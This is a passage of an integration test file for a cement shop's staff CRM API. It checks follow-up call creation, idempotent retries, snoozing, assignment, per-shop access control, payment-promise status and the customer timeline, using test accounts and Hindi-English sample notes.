import 'reflect-metadata';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { randomUUID } from 'node:crypto';
import { existsSync } from 'node:fs';
import type { Server } from 'node:http';
import { loadEnvFile } from 'node:process';
import type { INestApplication } from '@nestjs/common';
import { addDays, istToday, type StaffRole } from '@shiv/shared';
import request from 'supertest';
import { Db } from '../src/db';
import { addPerson, clearShopWork, confirmOrder, tokenFor } from './staff-helper';

if (existsSync('.env.test')) loadEnvFile('.env.test');
process.env.NODE_ENV = 'test';
process.env.DATABASE_URL = process.env.TEST_DATABASE_URL;
process.env.OTP_PROVIDER = 'mock';
process.env.OTP_HASH_SECRET = 'crm-test-only-secret-not-for-production';
process.env.CORS_ORIGINS = 'http://localhost:3000';
if (!process.env.DATABASE_URL || !new URL(process.env.DATABASE_URL).pathname.endsWith('_test'))
  throw new Error('These tests require a dedicated TEST_DATABASE_URL ending in _test.');

const MAIN = 'loc_main';
const SECOND = 'loc_crm_b';
let app: INestApplication;
let server: Server;
let db: Db;

const today = () => istToday();
const as = (id: string) => ({ Authorization: `Bearer ${tokenFor(id)}` });
const get = (who: string, path: string) => request(server).get(`/api/v1/${path}`).set(as(who));
const post = (who: string, path: string, body: object = {}) =>
  request(server).post(`/api/v1/${path}`).set(as(who)).send(body);
const patch = (who: string, path: string, body: object = {}) =>
  request(server).patch(`/api/v1/${path}`).set(as(who)).send(body);
const put = (who: string, path: string, body: object = {}) =>
  request(server).put(`/api/v1/${path}`).set(as(who)).send(body);

const staff: { id: string; role: StaffRole; shops?: string[] }[] = [
  { id: 'papa', role: 'OWNER' },
  { id: 'chacha', role: 'OWNER' },
  { id: 'manager', role: 'MANAGER', shops: [MAIN] },
  { id: 'managerb', role: 'MANAGER', shops: [SECOND] },
  { id: 'cashier', role: 'CASHIER', shops: [MAIN] },
  { id: 'cashierb', role: 'CASHIER', shops: [SECOND] },
  { id: 'cashierboth', role: 'CASHIER', shops: [MAIN, SECOND] },
  { id: 'accountant', role: 'ACCOUNTANT' },
  { id: 'keeper', role: 'STOCK_KEEPER', shops: [MAIN] },
  { id: 'driver', role: 'DRIVER', shops: [MAIN] },
  { id: 'helper', role: 'HELPER', shops: [MAIN] },
  { id: 'tech', role: 'TECH_OPERATOR' },
];
/** Those with no business in the CRM at all. */
const outsiders = ['keeper', 'driver', 'helper', 'tech', 'ramesh'];

const followUp = (customerId: string, extra: object = {}) => ({
  customerId,
  dueOn: today(),
  kind: 'CALLBACK',
  idempotencyKey: randomUUID(),
  ...extra,
});
const done = () => ({ action: 'DONE', idempotencyKey: randomUUID() });
const snooze = (dueOn: string, reason = 'Bahar gaye hain') => ({
  action: 'SNOOZE',
  dueOn,
  reason,
  idempotencyKey: randomUUID(),
});
const assign = (assigneeId: string | null) => ({
  action: 'ASSIGN',
  assigneeId,
  idempotencyKey: randomUUID(),
});
const made = async (who: string, customerId: string, extra: object = {}) =>
  (await post(who, 'admin/followups', followUp(customerId, extra)).expect(201)).body as {
    id: string;
    locationId: string;
  };
const due = async (who: string, query = '') =>
  (await get(who, `admin/followups${query ? `?${query}` : ''}`).expect(200)).body as {
    items: {
      id: string;
      promise: string | null;
      customer: { id: string; phone: string | null; phoneMasked: string };
      balancePaise: number | null;
      signedOff: boolean;
      reminderBlocked: string | null;
      paidSincePaise: number | null;
      overdueDays: number;
      snoozes: number;
      lastSnoozeReason: string | null;
      assignee: { id: string } | null;
    }[];
  };

/** A paper figure typed and an owner's signature, through the real routes. */
async function signed(customerId: string, paise: number, locationId = MAIN, asOf = today()) {
  const draft = await post('papa', 'admin/khata/opening-sheet', {
    customerId,
    asOf,
    paperPaise: paise,
    locationId,
  }).expect(201);
  const approved = await post('papa', 'admin/khata/opening-sheet/approve', {
    rows: [{ customerId, draftVersion: draft.body.version, chosenPaise: paise }],
  }).expect(201);
  expect(approved.body.signed, JSON.stringify(approved.body)).toBe(1);
}
const paid = (customerId: string, amountPaise: number, who = 'papa') =>
  post(who, `admin/customers/${customerId}/khata/payment`, {
    amountPaise,
    note: 'Paisa mila',
    channel: 'CASH',
    locationId: MAIN,
    idempotencyKey: randomUUID(),
  }).expect(201);
const remind = (who: string, customerId: string, extra: object = {}) =>
  post(who, `admin/customers/${customerId}/reminder`, {
    idempotencyKey: randomUUID(),
    ...extra,
  });

const address = (phone = '+919000006001', area = 'Kankarbagh') => ({
  label: 'Site',
  name: 'Customer',
  phone,
  line1: 'Plot 12',
  area,
  city: 'Patna',
  state: 'Bihar',
  pincode: '800020',
  landmark: '',
});
const creditOrder = async (phone = '+919000006001', extra: object = {}, who = 'papa') => {
  await db.user.updateMany({
    where: { phone, creditAllowed: false },
    data: { creditAllowed: true, creditLimitPaise: 100000000 },
  });
  const res = await post(who, 'admin/orders/phone', {
    customerPhone: phone,
    customerName: 'Customer',
    address: address(phone),
    items: [{ productId: 'cement', quantity: 1 }],
    deliveryDate: 'today',
    paymentMethod: 'CREDIT',
    idempotencyKey: randomUUID(),
    ...extra,
  });
  expect(res.status, JSON.stringify(res.body)).toBe(201);
  return res.body as { id: string; totalPaise: number; number: string };
};
const move = (id: string, status: string) =>
  patch('papa', `admin/orders/${id}/status`, { status, note: 'Test' });
const ledger = (orderId: string) => db.customerLedgerEntry.findMany({ where: { orderId } });
const balance = async (id: string) =>
  (await db.user.findUniqueOrThrow({ where: { id } })).khataBalancePaise;

beforeAll(async () => {
  const { createApp } = await import('../src/app');
  app = await createApp();
  await app.listen(0, '127.0.0.1');
  server = app.getHttpServer();
  db = app.get(Db);
}, 30000);
beforeEach(async () => {
  await clearShopWork(db);
  await db.$executeRawUnsafe(
    'TRUNCATE TABLE "PriceUpdateBatch", "RateSource", "FinancialMovement", "User", "Category", "Product", "Order", "Quote", "AuditLog", "OtpChallenge", "AuthRateLimit", "DeliveryZone", "StoreSettings", "Notification", "OutboundMessage", "WaThread", "ReportOpen", "TallyCompany", "TallyDevice", "KhataRecon", "PriceRule", "CustomerGroup" RESTART IDENTITY CASCADE',
  );
  await db.location.upsert({
    where: { id: SECOND },
    update: { active: true, stockStartedAt: new Date() },
    create: {
      id: SECOND,
      firmId: 'firm_main',
      slug: 'crm-b',
      name: 'Second shop',
      stockStartedAt: new Date(),
    },
  });
  let phone = 9000005000;
  for (const person of staff) await addPerson(db, { ...person, phone: `+91${++phone}` });
  await addPerson(db, { id: 'ramesh', phone: '+919000006001' });
  await addPerson(db, { id: 'suresh', phone: '+919000006002' });
  await addPerson(db, { id: 'mohan', phone: '+919000006003' });
  // The staff app and the customer app are different doors. Someone's staff login stays on the desk.
  await db.user.update({
    where: { id: 'ramesh' },
    data: { name: 'Ramesh Kumar', area: 'Danapur' },
  });
  await db.category.create({ data: { id: 'category', name: 'Cement', slug: 'cement' } });
  await db.product.create({
    data: {
      id: 'cement',
      name: 'Test cement',
      brand: 'Test',
      categoryId: 'category',
      type: 'PPC',
      grade: 'PPC',
      unit: 'bag',
      pricePaise: 40000,
      stock: 1000,
      description: 'Test product',
      recommendedUse: 'Test',
      images: [],
    },
  });
  await db.stockLevel.upsert({
    where: { productId_locationId: { productId: 'cement', locationId: SECOND } },
    update: { quantity: 500 },
    create: { productId: 'cement', locationId: SECOND, quantity: 500 },
  });
  await db.deliveryZone.create({
    data: {
      id: 'zone',
      name: 'Patna',
      deliveryFeePaise: 0,
      estimate: 'Today',
      pincodes: { create: { pincode: '800020' } },
    },
  });
  await db.storeSettings.create({ data: { id: 'store', phone: '+919999999000' } });
});
afterAll(async () => {
  await app?.close();
});

describe('Aaj ke call', () => {
  it('an owner writes a call and it is on the list the same day, with who wrote it logged', async () => {
    const row = await made('papa', 'ramesh', { note: 'Kal ka hisaab', kind: 'PAYMENT' });
    const { items } = await due('papa');
    expect(items.map((item) => item.id)).toEqual([row.id]);
    const log = await db.auditLog.findMany({ where: { event: 'FOLLOWUP_CREATED' } });
    expect(log).toHaveLength(1);
    expect(log[0]).toMatchObject({ actorId: 'papa', entityId: 'ramesh', locationId: MAIN });
    expect(JSON.stringify(log[0]!.details)).not.toContain('Kal ka hisaab');
  });
  it('a call for tomorrow waits, and shows under what is coming', async () => {
    const row = await made('papa', 'ramesh', { dueOn: addDays(today(), 1) });
    expect((await due('papa')).items).toEqual([]);
    const { items } = (await get('papa', 'admin/followups?view=upcoming').expect(200)).body;
    expect(items.map((item: { id: string }) => item.id)).toEqual([row.id]);
  });
  it('yesterday’s missed call stays on the list until someone does it', async () => {
    const row = await made('papa', 'ramesh');
    await db.followUp.update({ where: { id: row.id }, data: { dueOn: addDays(today(), -3) } });
    const { items } = await due('papa');
    expect(items[0]!.overdueDays).toBe(3);
  });
  it('one tap marks it done, it leaves the list, and it can be looked up', async () => {
    const row = await made('cashier', 'ramesh');
    const body = (await patch('cashier', `admin/followups/${row.id}`, done()).expect(200)).body;
    expect(body.doneAt).toBeTruthy();
    expect((await due('papa')).items).toEqual([]);
    const { items } = (await get('papa', 'admin/followups?view=done').expect(200)).body;
    expect(items.map((item: { id: string }) => item.id)).toEqual([row.id]);
    expect((await db.followUp.findUniqueOrThrow({ where: { id: row.id } })).doneById).toBe(
      'cashier',
    );
  });
  it('the empty list is an empty list, for each role that may read it', async () => {
    for (const who of ['papa', 'manager', 'cashier', 'accountant'])
      expect((await due(who)).items).toEqual([]);
  });
});

describe('duplicates and replays', () => {
  it('a lost reply and a retry make one call and one log line', async () => {
    const body = followUp('ramesh', { kind: 'PAYMENT', promisedPaise: 5000 });
    const first = await post('papa', 'admin/followups', body).expect(201);
    const second = await post('papa', 'admin/followups', body).expect(201);
    expect(second.body.id).toBe(first.body.id);
    expect(await db.followUp.count()).toBe(1);
    expect(await db.auditLog.count({ where: { event: 'FOLLOWUP_CREATED' } })).toBe(1);
  });
  it('the same key with different words is refused', async () => {
    const body = followUp('ramesh');
    await post('papa', 'admin/followups', body).expect(201);
    const res = await post('papa', 'admin/followups', { ...body, note: 'Kuch aur' }).expect(409);
    expect(res.body.error.code).toBe('IDEMPOTENCY_CONFLICT');
  });
  it('another shop replaying someone’s key learns nothing', async () => {
    const body = followUp('ramesh');
    await post('cashier', 'admin/followups', body).expect(201);
    const res = await post('cashierb', 'admin/followups', body).expect(409);
    expect(res.body.error.code).toBe('IDEMPOTENCY_CONFLICT');
    expect(JSON.stringify(res.body)).not.toContain(MAIN);
  });
  it('two people writing the same call for the same day make one call', async () => {
    const first = await made('manager', 'ramesh', { kind: 'PAYMENT' });
    const second = await made('cashier', 'ramesh', { kind: 'PAYMENT' });
    expect(second.id).toBe(first.id);
    expect(await db.followUp.count()).toBe(1);
  });
  it('a different kind or another shop is a different call', async () => {
    await made('manager', 'ramesh', { kind: 'PAYMENT' });
    await made('manager', 'ramesh', { kind: 'ORDER' });
    await made('managerb', 'ramesh', { kind: 'PAYMENT' });
    expect(await db.followUp.count()).toBe(3);
  });
  it('a burst of different keys at once still makes one call', async () => {
    const results = await Promise.all(
      Array.from({ length: 8 }, () =>
        post('papa', 'admin/followups', followUp('ramesh', { kind: 'PAYMENT' })),
      ),
    );
    // Serializable retries may run out under the burst; nobody gets a second row either way.
    expect(results.every((res) => res.status === 201 || res.status === 409)).toBe(true);
    expect(results.some((res) => res.status === 201)).toBe(true);
    expect(await db.followUp.count()).toBe(1);
    expect(await db.auditLog.count({ where: { event: 'FOLLOWUP_CREATED' } })).toBe(1);
  });
  it('Done twice, by key or by another person, happens once', async () => {
    const row = await made('papa', 'ramesh');
    const tap = done();
    await patch('papa', `admin/followups/${row.id}`, tap).expect(200);
    await patch('papa', `admin/followups/${row.id}`, tap).expect(200);
    await patch('chacha', `admin/followups/${row.id}`, done()).expect(200);
    expect(await db.followUpEvent.count({ where: { followUpId: row.id } })).toBe(1);
    expect(await db.auditLog.count({ where: { event: 'FOLLOWUP_DONE' } })).toBe(1);
    expect((await db.followUp.findUniqueOrThrow({ where: { id: row.id } })).doneById).toBe('papa');
  });
  it('a burst of Done taps at once writes one event', async () => {
    const row = await made('papa', 'ramesh');
    await Promise.all(
      Array.from({ length: 6 }, () => patch('papa', `admin/followups/${row.id}`, done())),
    );
    expect(await db.followUpEvent.count({ where: { followUpId: row.id, action: 'DONE' } })).toBe(1);
  });
  it('a retried snooze moves it once', async () => {
    const row = await made('papa', 'ramesh');
    const tap = snooze(addDays(today(), 2));
    await patch('papa', `admin/followups/${row.id}`, tap).expect(200);
    await patch('papa', `admin/followups/${row.id}`, tap).expect(200);
    expect((await db.followUp.findUniqueOrThrow({ where: { id: row.id } })).snoozes).toBe(1);
  });
  it('a key used for one action cannot be used for another', async () => {
    const row = await made('papa', 'ramesh');
    const tap = snooze(addDays(today(), 2));
    await patch('papa', `admin/followups/${row.id}`, tap).expect(200);
    const res = await patch('papa', `admin/followups/${row.id}`, {
      action: 'DONE',
      idempotencyKey: tap.idempotencyKey,
    }).expect(409);
    expect(res.body.error.code).toBe('IDEMPOTENCY_CONFLICT');
  });
});

describe('snoozing', () => {
  it('needs a reason, keeps it, counts it, and keeps the words out of the audit log', async () => {
    const row = await made('papa', 'ramesh');
    const next = addDays(today(), 3);
    await patch('papa', `admin/followups/${row.id}`, snooze(next, 'Shaadi mein gaye hain')).expect(
      200,
    );
    const after = await db.followUp.findUniqueOrThrow({
      where: { id: row.id },
      include: { events: true },
    });
    expect(after).toMatchObject({ dueOn: next, snoozes: 1 });
    expect(after.events[0]).toMatchObject({
      action: 'SNOOZED',
      fromDueOn: today(),
      toDueOn: next,
      reason: 'Shaadi mein gaye hain',
    });
    const log = await db.auditLog.findFirstOrThrow({ where: { event: 'FOLLOWUP_SNOOZED' } });
    expect(JSON.stringify(log.details)).not.toContain('Shaadi');
    expect((await due('papa')).items).toEqual([]);
    const upcoming = (await get('papa', 'admin/followups?view=upcoming').expect(200)).body;
    expect(upcoming.items[0].lastSnoozeReason).toBe('Shaadi mein gaye hain');
  });
  it('refuses no reason, and a blank one', async () => {
    const row = await made('papa', 'ramesh');
    const next = addDays(today(), 1);
    await patch('papa', `admin/followups/${row.id}`, {
      action: 'SNOOZE',
      dueOn: next,
      idempotencyKey: randomUUID(),
    }).expect(400);
    await patch('papa', `admin/followups/${row.id}`, snooze(next, '   ')).expect(400);
  });
  it('refuses today, the past, the same day, a far-off day and a made-up date', async () => {
    const row = await made('papa', 'ramesh', { dueOn: addDays(today(), 5) });
    for (const dueOn of [
      today(),
      addDays(today(), -1),
      addDays(today(), 5),
      addDays(today(), 400),
    ]) {
      const res = await patch('papa', `admin/followups/${row.id}`, snooze(dueOn)).expect(400);
      expect(res.body.error.code).toBe('INVALID_DUE_DATE');
    }
    await patch('papa', `admin/followups/${row.id}`, snooze('2026-02-31')).expect(400);
    expect((await db.followUp.findUniqueOrThrow({ where: { id: row.id } })).snoozes).toBe(0);
  });
  it('a done call cannot be moved or handed on', async () => {
    const row = await made('papa', 'ramesh');
    await patch('papa', `admin/followups/${row.id}`, done()).expect(200);
    const moved = await patch('papa', `admin/followups/${row.id}`, snooze(addDays(today(), 1)));
    expect(moved.status).toBe(409);
    expect(moved.body.error.code).toBe('FOLLOWUP_DONE');
    const handed = await patch('papa', `admin/followups/${row.id}`, assign('cashier'));
    expect(handed.status).toBe(409);
  });
});

describe('creating: bad input', () => {
  it('refuses a date in the past or beyond a year', async () => {
    for (const dueOn of [addDays(today(), -1), addDays(today(), 400)]) {
      const res = await post('papa', 'admin/followups', followUp('ramesh', { dueOn })).expect(400);
      expect(res.body.error.code).toBe('INVALID_DUE_DATE');
    }
  });
  it('refuses a customer who does not exist, is staff, is closed or is the walk-in row', async () => {
    await db.user.create({ data: { id: 'walkin', phone: 'walk-in:store', name: 'Walk-in' } });
    await db.user.update({ where: { id: 'mohan' }, data: { deletedAt: new Date() } });
    for (const id of ['nobody', 'papa', 'mohan', 'walkin']) {
      const res = await post('papa', 'admin/followups', followUp(id)).expect(404);
      expect(res.body.error.code).toBe('CUSTOMER_NOT_FOUND');
    }
    expect(await db.followUp.count()).toBe(0);
  });
  it('refuses a closed or unknown shop', async () => {
    const res = await post('papa', 'admin/followups', followUp('ramesh', { locationId: 'nope' }));
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('INVALID_SHOP');
  });
  it('refuses a hidden field that would mark it done or change who wrote it', async () => {
    for (const extra of [{ doneAt: new Date() }, { createdById: 'papa' }, { snoozes: 9 }])
      await post('cashier', 'admin/followups', followUp('ramesh', extra)).expect(400);
  });
  it('refuses a promise on a call that is not about money', async () => {
    await post('papa', 'admin/followups', followUp('ramesh', { promisedPaise: 100 })).expect(400);
  });
  it('someone at two shops must say which, and only one of theirs', async () => {
    const res = await post('cashierboth', 'admin/followups', followUp('ramesh')).expect(400);
    expect(res.body.error.code).toBe('SHOP_REQUIRED');
    await post('cashierboth', 'admin/followups', followUp('ramesh', { locationId: SECOND })).expect(
      201,
    );
  });
  it('a bad cursor or filter is a plain refusal, not a server error', async () => {
    const forged = Buffer.from(JSON.stringify({ scope: 'x', value: 5, id: 'x' })).toString(
      'base64url',
    );
    for (const query of [
      'view=upcoming&cursor=garbage',
      `view=upcoming&cursor=${forged}`,
      'view=done&cursor=garbage',
      'view=nope',
      'mine=2',
      'extra=1',
      'view=due&view=done',
    ])
      await get('papa', `admin/followups?${query}`).expect(400);
  });
});

describe('who may do what with a call', () => {
  it('nobody gets in without signing in', async () => {
    await request(server).get('/api/v1/admin/followups').expect(401);
    await request(server).post('/api/v1/admin/followups').send({}).expect(401);
    await request(server).patch('/api/v1/admin/followups/x').send({}).expect(401);
  });
  it.each(outsiders)('%s reaches none of it', async (who) => {
    const row = await made('papa', 'ramesh');
    await get(who, 'admin/followups').expect(403);
    await post(who, 'admin/followups', followUp('suresh')).expect(403);
    await patch(who, `admin/followups/${row.id}`, done()).expect(403);
  });
  it('a shop’s people see only their shop’s calls', async () => {
    const a = await made('manager', 'ramesh');
    const b = await made('managerb', 'suresh');
    const ids = async (who: string) => (await due(who)).items.map((row) => row.id);
    expect(await ids('manager')).toEqual([a.id]);
    expect(await ids('cashier')).toEqual([a.id]);
    expect(await ids('managerb')).toEqual([b.id]);
    expect(await ids('cashierb')).toEqual([b.id]);
    expect((await ids('cashierboth')).sort()).toEqual([a.id, b.id].sort());
    expect((await ids('papa')).sort()).toEqual([a.id, b.id].sort());
    expect((await ids('accountant')).sort()).toEqual([a.id, b.id].sort());
  });
  it('asking for another shop by name is refused, not emptied', async () => {
    await get('manager', `admin/followups?locationId=${SECOND}`).expect(403);
    await get('cashierb', `admin/followups?locationId=${MAIN}`).expect(403);
    await get('papa', `admin/followups?locationId=${SECOND}`).expect(200);
  });
  it('another shop’s call cannot be done, moved or handed on, even by id', async () => {
    const row = await made('manager', 'ramesh');
    for (const body of [done(), snooze(addDays(today(), 1)), assign('managerb')]) {
      await patch('managerb', `admin/followups/${row.id}`, body).expect(403);
      await patch('cashierb', `admin/followups/${row.id}`, body).expect(403);
    }
    const after = await db.followUp.findUniqueOrThrow({ where: { id: row.id } });
    expect(after).toMatchObject({ doneAt: null, snoozes: 0, assigneeId: null });
  });
  it('a call cannot be written at another shop', async () => {
    await post('manager', 'admin/followups', followUp('ramesh', { locationId: SECOND })).expect(
      403,
    );
    await post('cashier', 'admin/followups', followUp('ramesh', { locationId: SECOND })).expect(
      403,
    );
  });
  it('the accountant reads the list and changes nothing', async () => {
    const row = await made('papa', 'ramesh');
    expect((await due('accountant')).items).toHaveLength(1);
    await post('accountant', 'admin/followups', followUp('suresh')).expect(403);
    await patch('accountant', `admin/followups/${row.id}`, done()).expect(403);
  });
  it('an unknown call answers plainly', async () => {
    const res = await patch('papa', 'admin/followups/nope', done()).expect(404);
    expect(res.body.error.code).toBe('FOLLOWUP_NOT_FOUND');
  });
  it('a paused owner is locked out of the next request', async () => {
    const row = await made('chacha', 'ramesh');
    await db.user.update({ where: { id: 'chacha' }, data: { staffPausedAt: new Date() } });
    await get('chacha', 'admin/followups').expect(403);
    await patch('chacha', `admin/followups/${row.id}`, done()).expect(403);
  });
});

describe('handing a call to someone', () => {
  it('a manager gives it to someone at their shop, and it shows on their own list', async () => {
    const row = await made('manager', 'ramesh');
    const res = await patch('manager', `admin/followups/${row.id}`, assign('cashier')).expect(200);
    expect(res.body.assignee).toMatchObject({ id: 'cashier' });
    expect((await due('cashier', 'mine=1')).items.map((item) => item.id)).toEqual([row.id]);
    expect((await due('manager', 'mine=1')).items).toEqual([]);
    const log = await db.auditLog.findFirstOrThrow({ where: { event: 'FOLLOWUP_ASSIGNED' } });
    expect(log.details).toMatchObject({ to: 'cashier', from: null });
  });
  it('a cashier cannot hand a call to anyone', async () => {
    const row = await made('manager', 'ramesh');
    await patch('cashier', `admin/followups/${row.id}`, assign('manager')).expect(403);
  });
  it('a cashier may write a call for themselves and not for someone else', async () => {
    await post('cashier', 'admin/followups', followUp('ramesh', { assigneeId: 'cashier' })).expect(
      201,
    );
    await post('cashier', 'admin/followups', followUp('suresh', { assigneeId: 'manager' })).expect(
      403,
    );
  });
  it.each([
    ['someone at another shop', 'cashierb'],
    ['the accountant, who calls nobody', 'accountant'],
    ['a stock keeper', 'keeper'],
    ['a customer', 'ramesh'],
    ['nobody at all', 'nobody'],
  ])('refuses %s', async (_label, assignee) => {
    const row = await made('manager', 'suresh');
    const res = await patch('manager', `admin/followups/${row.id}`, assign(assignee)).expect(400);
    expect(res.body.error.code).toBe('INVALID_ASSIGNEE');
  });
  it('refuses someone paused or who has left', async () => {
    const row = await made('manager', 'suresh');
    await db.user.update({ where: { id: 'cashier' }, data: { staffPausedAt: new Date() } });
    await patch('manager', `admin/followups/${row.id}`, assign('cashier')).expect(400);
    await db.user.update({ where: { id: 'cashier' }, data: { staffPausedAt: null } });
    await db.staffMembership.updateMany({
      where: { userId: 'cashier' },
      data: { endedAt: new Date() },
    });
    await patch('manager', `admin/followups/${row.id}`, assign('cashier')).expect(400);
  });
  it('an owner reaches any shop’s people, and can take a name off', async () => {
    const row = await made('managerb', 'suresh');
    await patch('papa', `admin/followups/${row.id}`, assign('cashierb')).expect(200);
    const off = await patch('papa', `admin/followups/${row.id}`, assign(null)).expect(200);
    expect(off.body.assignee).toBeNull();
  });
  it('giving it to the same person again writes nothing', async () => {
    const row = await made('manager', 'ramesh', { assigneeId: 'cashier' });
    await patch('manager', `admin/followups/${row.id}`, assign('cashier')).expect(200);
    expect(await db.followUpEvent.count({ where: { followUpId: row.id } })).toBe(0);
  });
});

describe('who a call can be given to', () => {
  const people = async (who: string, shop: string) =>
    (await get(who, `admin/followups/people?locationId=${shop}`).expect(200)).body.items.map(
      (row: { id: string }) => row.id,
    );
  it('lists only people who can take that shop’s calls', async () => {
    const list = await people('manager', MAIN);
    expect(list).toEqual(expect.arrayContaining(['manager', 'cashier', 'cashierboth', 'papa']));
    for (const id of ['managerb', 'cashierb', 'accountant', 'keeper', 'driver', 'helper', 'tech'])
      expect(list).not.toContain(id);
  });
  it('leaves out someone paused or gone', async () => {
    await db.user.update({ where: { id: 'cashier' }, data: { staffPausedAt: new Date() } });
    expect(await people('manager', MAIN)).not.toContain('cashier');
  });
  it('a manager cannot read another shop’s people, and must name a shop', async () => {
    await get('manager', `admin/followups/people?locationId=${SECOND}`).expect(403);
    await get('manager', 'admin/followups/people').expect(400);
  });
  it.each(['cashier', 'accountant', ...outsiders])('%s is refused', async (who) => {
    await get(who, `admin/followups/people?locationId=${MAIN}`).expect(403);
  });
});

describe('promises', () => {
  it('a broken promise comes first, then the longest overdue, and a kept one last', async () => {
    await signed('ramesh', 500000);
    await signed('suresh', 500000);
    const open = await made('papa', 'mohan', { kind: 'CALLBACK' });
    const broken = await made('papa', 'ramesh', { kind: 'PAYMENT', promisedPaise: 100000 });
    const kept = await made('papa', 'suresh', { kind: 'PAYMENT', promisedPaise: 100000 });
    await db.followUp.updateMany({
      where: { id: { in: [broken.id, kept.id] } },
      data: { dueOn: addDays(today(), -1) },
    });
    await paid('suresh', 100000);
    const { items } = await due('papa');
    expect(items.map((row) => row.id)).toEqual([broken.id, open.id, kept.id]);
    expect(items.map((row) => row.promise)).toEqual(['BROKEN', null, 'KEPT']);
    expect(items[2]!.paidSincePaise).toBe(100000);
  });
  it('money that came in before the promise does not keep it', async () => {
    await signed('ramesh', 500000);
    await paid('ramesh', 300000);
    const row = await made('papa', 'ramesh', { kind: 'PAYMENT', promisedPaise: 100000 });
    await db.followUp.update({ where: { id: row.id }, data: { dueOn: addDays(today(), -1) } });
    expect((await due('papa')).items[0]).toMatchObject({ promise: 'BROKEN', paidSincePaise: 0 });
  });
  it('a bounced payment un-keeps a promise', async () => {
    await signed('ramesh', 500000);
    const row = await made('papa', 'ramesh', { kind: 'PAYMENT', promisedPaise: 100000 });
    await db.followUp.update({ where: { id: row.id }, data: { dueOn: addDays(today(), -1) } });
    const payment = await paid('ramesh', 100000);
    expect((await due('papa')).items[0]!.promise).toBe('KEPT');
    await post('papa', `admin/customers/ramesh/khata/reverse/${payment.body.id}`, {
      note: 'Cheque laut gaya',
      idempotencyKey: randomUUID(),
    }).expect(201);
    expect((await due('papa')).items[0]).toMatchObject({ promise: 'BROKEN', paidSincePaise: 0 });
  });
  it('someone else’s payment does not keep this customer’s promise', async () => {
    await signed('ramesh', 500000);
    await signed('suresh', 500000);
    const row = await made('papa', 'ramesh', { kind: 'PAYMENT', promisedPaise: 100000 });
    await db.followUp.update({ where: { id: row.id }, data: { dueOn: addDays(today(), -1) } });
    await paid('suresh', 100000);
    expect((await due('papa')).items[0]!.promise).toBe('BROKEN');
  });
});

describe('what a row shows', () => {
  it('no balance before sign-off, and the reason no reminder can go', async () => {
    await db.user.update({ where: { id: 'ramesh' }, data: { khataBalancePaise: 12345 } });
    await made('papa', 'ramesh');
    const [row] = (await due('papa')).items;
    expect(row).toMatchObject({
      signedOff: false,
      balancePaise: null,
      reminderBlocked: 'NOT_SIGNED',
    });
    expect(JSON.stringify(row)).not.toContain('12345');
  });
  it('the balance after sign-off, to those who may read one', async () => {
    await signed('ramesh', 50000);
    await made('manager', 'ramesh');
    for (const who of ['papa', 'manager', 'cashier', 'accountant'])
      expect((await due(who)).items[0]).toMatchObject({
        signedOff: true,
        balancePaise: 50000,
        reminderBlocked: null,
      });
  });
  it('the number comes to those who ring, and not to the accountant', async () => {
    await made('manager', 'ramesh');
    for (const who of ['papa', 'manager', 'cashier'])
      expect((await due(who)).items[0]!.customer.phone).toBe('+919000006001');
    const [row] = (await due('accountant')).items;
    expect(row!.customer).toMatchObject({ phone: null, phoneMasked: '+91XXXXXXX001' });
    expect(JSON.stringify(row)).not.toContain('9000006001');
  });
  it('a closed account’s calls vanish from the list and lose their words', async () => {
    const row = await made('papa', 'ramesh', { note: 'Ghar ki baat' });
    await patch('papa', `admin/followups/${row.id}`, snooze(addDays(today(), 1), 'Bimaar hain'));
    await post('ramesh', 'me/delete', { confirmation: 'DELETE' }).expect(201);
    expect((await get('papa', 'admin/followups?view=upcoming').expect(200)).body.items).toEqual([]);
    const after = await db.followUp.findUniqueOrThrow({
      where: { id: row.id },
      include: { events: true },
    });
    expect(after.note).toBe('');
    expect(after.doneAt).not.toBeNull();
    expect(after.events.every((event) => event.reason === '')).toBe(true);
  });
  it('someone made staff later drops off the call list', async () => {
    await made('papa', 'ramesh');
    await db.user.update({ where: { id: 'ramesh' }, data: { role: 'ADMIN' } });
    expect((await due('papa')).items).toEqual([]);
  });
});

describe('the timeline', () => {
  const timeline = (who: string, id = 'ramesh', query = '') =>
    get(who, `admin/customers/${id}/timeline${query}`);
  const kinds = (body: { items: { kind: string }[] }) => body.items.map((row) => row.kind);

  it('puts orders, money, reminders, calls, notes and follow-ups on one list, newest first', async () => {
    const order = await creditOrder();
    await signed('ramesh', 50000);
    await paid('ramesh', 10000);
    await post('papa', 'admin/customers/ramesh/notes', { body: 'Subah call karna' }).expect(201);
    await post('papa', 'admin/customers/ramesh/contacts', {
      channel: 'CALL',
      purpose: 'Baat ki',
    }).expect(201);
    await remind('papa', 'ramesh').expect(201);
    await made('papa', 'ramesh', { kind: 'PAYMENT', promisedPaise: 5000 });
    const { body } = await timeline('papa').expect(200);
    const seen = new Set(kinds(body));
    for (const kind of ['ORDER', 'KHATA', 'NOTE', 'CONTACT', 'FOLLOWUP'])
      expect(seen).toContain(kind);
    const times = body.items.map((row: { at: string }) => Date.parse(row.at));
    expect([...times].sort((a, b) => b - a)).toEqual(times);
    const contacts = body.items.filter((row: { kind: string }) => row.kind === 'CONTACT');
    expect(contacts.map((row: { contactKind: string }) => row.contactKind).sort()).toEqual([
      'CALL',
      'REMINDER',
    ]);
    const orderRow = body.items.find((row: { kind: string }) => row.kind === 'ORDER');
    expect(orderRow).toMatchObject({
      id: order.id,
      number: order.number,
      totalPaise: order.totalPaise,
    });
    const noteRow = body.items.find((row: { kind: string }) => row.kind === 'NOTE');
    expect(noteRow).toMatchObject({ body: 'Subah call karna', actorName: 'papa' });
  });
  it('an empty customer is an empty list', async () => {
    const { body } = await timeline('papa', 'mohan').expect(200);
    expect(body).toMatchObject({ items: [], nextCursor: null });
  });
  it('pages without a gap or a repeat, even when moments tie', async () => {
    await signed('ramesh', 500000);
    const at = new Date('2026-10-01T10:00:00Z');
    for (let index = 0; index < 5; index++) {
      await db.customerNote.create({
        data: { customerId: 'ramesh', actorId: 'papa', body: `n${index}`, createdAt: at },
      });
      await db.customerContact.create({
        data: {
          customerId: 'ramesh',
          actorId: 'papa',
          channel: 'CALL',
          purpose: 'x',
          createdAt: at,
        },
      });
    }
    const seen: string[] = [];
    let cursor: string | null = null;
    let pages = 0;
    do {
      const res: request.Response = await timeline(
        'papa',
        'ramesh',
        `?limit=3${cursor ? `&cursor=${cursor}` : ''}`,
      ).expect(200);
      expect(res.body.items.length).toBeLessThanOrEqual(3);
